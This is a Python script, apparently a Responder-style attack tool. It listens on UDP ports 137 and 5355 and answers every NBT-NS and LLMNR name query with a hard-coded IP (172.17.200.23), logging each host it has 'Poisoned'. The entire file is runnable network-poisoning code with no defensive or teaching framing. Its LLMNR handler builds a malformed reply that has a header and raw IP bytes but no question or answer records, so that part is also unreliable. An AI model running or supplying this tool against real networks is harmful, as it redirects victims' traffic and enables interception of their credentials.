import socket
import struct
import threading
import sys

TARGET_IP = '172.17.200.23'

def create_nbns_response(data, addr):
    if len(data) < 12:
        return None
    
    tid = struct.unpack('>H', data[0:2])[0]
    flags = struct.unpack('>H', data[2:4])[0]
    
    # Only respond to queries (not responses)
    if flags & 0x8000:
        return None
    
    qdcount = struct.unpack('>H', data[4:6])[0]
    if qdcount == 0:
        return None
    
    # Parse question
    pos = 12
    name_parts = []
    while pos < len(data):
        length = data[pos]
        if length == 0:
            pos += 1
            break
        if length & 0xC0:  # compressed
            pos += 2
            break
        pos += 1
        name_parts.append(data[pos:pos+length])
        pos += length
    
    qname = b'.'.join(name_parts)
    if len(data) >= pos + 4:
        qtype = struct.unpack('>H', data[pos:pos+2])[0]
        qclass = struct.unpack('>H', data[pos+2:pos+4])[0]
    else:
        return None
    
    # Only respond to NB (0x0020) queries
    if qtype != 0x0020:
        return None
    
    # Pad name to 34 bytes
    if len(qname) > 30:
        return None
    
    padded_name = data[12:pos]
    if len(padded_name) < 34:
        padded_name += b'\x00' * (34 - len(padded_name))
    padded_name = padded_name[:34]
    # Ensure ends with double null
    if padded_name[-1:] != b'\x00':
        padded_name += b'\x00'
    if padded_name[-2:-1] != b'\x00':
        padded_name = padded_name[:-1] + b'\x00\x00'
    
    # Build response
    resp_flags = 0x8500  # response, authoritative, no error
    
    encoded_name = padded_name
    
    # Question
    question = encoded_name
    question += struct.pack('>H', qtype)
    question += struct.pack('>H', qclass)
    
    # Answer
    answer = encoded_name
    answer += struct.pack('>H', 0x0020)  # NB
    answer += struct.pack('>H', 0x0001)  # IN
    answer += struct.pack('>I', 300)     # TTL
    answer += struct.pack('>H', 6)       # rdata length
    ip_parts = [int(x) for x in TARGET_IP.split('.')]
    answer += struct.pack('>BB', 0x00, 0x00)  # flags
    answer += struct.pack('>BBBB', *ip_parts)
    
    resp = struct.pack('>H', tid)
    resp += struct.pack('>H', resp_flags)
    resp += struct.pack('>H', 1)   # questions
    resp += struct.pack('>H', 1)   # answers
    resp += struct.pack('>H', 0)   # authority
    resp += struct.pack('>H', 0)   # additional
    resp += question + answer
    
    return resp

def nbns_listener():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 137))
    
    while True:
        try:
            data, addr = sock.recvfrom(1024)
            resp = create_nbns_response(data, addr)
            if resp:
                sock.sendto(resp, (addr[0], 137))
                print(f"[NBT-NS] Poisoned '{addr[0]}' -> {TARGET_IP}")
        except:
            pass

def llmnr_listener():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 5355))
    
    while True:
        try:
            data, addr = sock.recvfrom(1024)
            if len(data) > 12:
                tid = struct.unpack('>H', data[0:2])[0]
                flags = struct.unpack('>H', data[2:4])[0]
                if not (flags & 0x8000):
                    qdcount = struct.unpack('>H', data[4:6])[0]
                    if qdcount > 0:
                        # Simple LLMNR response
                        resp = bytearray(data[:12])
                        resp[2:4] = struct.pack('>H', 0x8000 | (flags & 0x0f))
                        resp[6:8] = struct.pack('>H', qdcount)  # answers
                        ip_parts = [int(x) for x in TARGET_IP.split('.')]
                        resp += struct.pack('>BBBB', *ip_parts)
                        sock.sendto(resp, (addr[0], 5355))
                        print(f"[LLMNR] Poisoned '{addr[0]}' -> {TARGET_IP}")
        except:
            pass

if __name__ == '__main__':
    print(f"[*] Starting responder poisoning to {TARGET_IP}")
    t1 = threading.Thread(target=nbns_listener, daemon=True)
    t2 = threading.Thread(target=llmnr_listener, daemon=True)
    t1.start()
    t2.start()
    print("[+] NBT-NS listener on port 137")
    print("[+] LLMNR listener on port 5355")
    t1.join()
